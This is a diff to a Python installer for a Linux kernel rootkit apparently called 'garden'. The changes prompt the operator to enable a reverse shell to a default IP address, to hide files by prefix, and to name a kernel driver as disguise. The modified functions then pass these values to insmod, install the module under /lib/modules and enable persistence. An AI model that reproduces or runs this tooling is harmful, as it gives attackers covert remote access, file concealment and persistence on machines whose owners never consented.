@@ -118,19 +118,19 @@ def run_cmd(command):
 # Build Process
 ####
 
+# TODO: Remove this once you're sure we don't need a config.h file.
+# def create_config_header_file(user_defines: dict, path: str):
+# 	"""
+# 	Creates config.h file and populates it with user defined constants.
+# 	:param: user_defines: dict
+# 	"""
+# 	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
+# 	for key, val in user_defines.items():
+# 		contents += "#define {} {}\n".format(key, val)
+# 	contents += "#endif"
 
-def create_config_header_file(user_defines: dict, path: str):
-	"""
-	Creates config.h file and populates it with user defined constants.
-	:param: user_defines: dict
-	"""
-	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
-	for key, val in user_defines.items():
-		contents += "#define {} {}\n".format(key, val)
-	contents += "#endif"
-
-	with open(path, "w") as f:
-		f.write(contents)
+# 	with open(path, "w") as f:
+# 		f.write(contents)
 
 ####
 # Kernel Module Loading/Unloading
@@ -160,9 +160,25 @@ def is_module_already_persistent(module_name):
 			return False
 
 
-def load_module(module_path):
+def load_module(module_path, config):
+	"""
+	Run $ insmod module, appending any included parameters.
+	"""
 	print_status("Loading module...")
-	run_cmd_exit_on_fail("insmod {}".format(module_path), run_with_os=True)
+	if "REVERSE_SHELL_IP" not in config:
+		rev_shell_ip = ""
+	else:
+		rev_shell_ip = config["REVERSE_SHELL_IP"]
+
+	if "HIDDEN_FILE_PREFIX" not in config:
+		hidden_file_prefix = ""
+	else:
+		hidden_file_prefix = config["HIDDEN_FILE_PREFIX"]
+
+	cmd = "insmod {} rev_shell_ip=\"{}\" hidden_file_prefix=\"{}\"".format(module_path,
+	                                                                       rev_shell_ip,
+	                                                                       hidden_file_prefix)
+	run_cmd_exit_on_fail(cmd, run_with_os=True)
 
 
 def unload_module(module_name):
@@ -229,16 +245,20 @@ def install(kernel_version):
 
 	config = {}
 	config["MODULE_NAME"] = "garden"
-	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
-	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
-	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
+
+	if prompt_yes_no("Enable reverse shell?"):
+		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", "222.173.190.239")  # 0xDEADBEEF as an IP address.
+
+	if prompt_yes_no("Enable hidden files?"):
+		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "garden")
 
 	run_cmd_exit_on_fail("make clean", "./rootkit")
 
-	config_path = "./rootkit/config.h"
-	print_status("Creating config file...")
-	create_config_header_file(config, config_path)
-	print_success("{} created.".format(config_path))
+	# TODO: Remove this block of code once you're sure we don't need a config.h file.
+	# config_path = "./rootkit/config.h"
+	# print_status("Creating config file...")
+	# create_config_header_file(config, config_path)
+	# print_success("{} created.".format(config_path))
 
 	# Compile rootkit
 	print_status("Compiling rootkit...")
@@ -247,7 +267,8 @@ def install(kernel_version):
 
 	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
 	print_status("Installing rootkit...")
-	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
+	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
+	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, driver_name)
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
 
@@ -267,10 +288,9 @@ def install(kernel_version):
 		enable_persistence(config["MODULE_NAME"])
 
 	run_cmd_exit_on_fail("depmod")
-	# Unload kernel module if it's already loaded.
+	# Unload kernel module if it's already loaded and load new module.
 	unload_module(config["MODULE_NAME"])
-	# Load kernel module
-	load_module(module_dest_path)
+	load_module(module_dest_path, config)
 	print_success("Successful installation.")
 
 
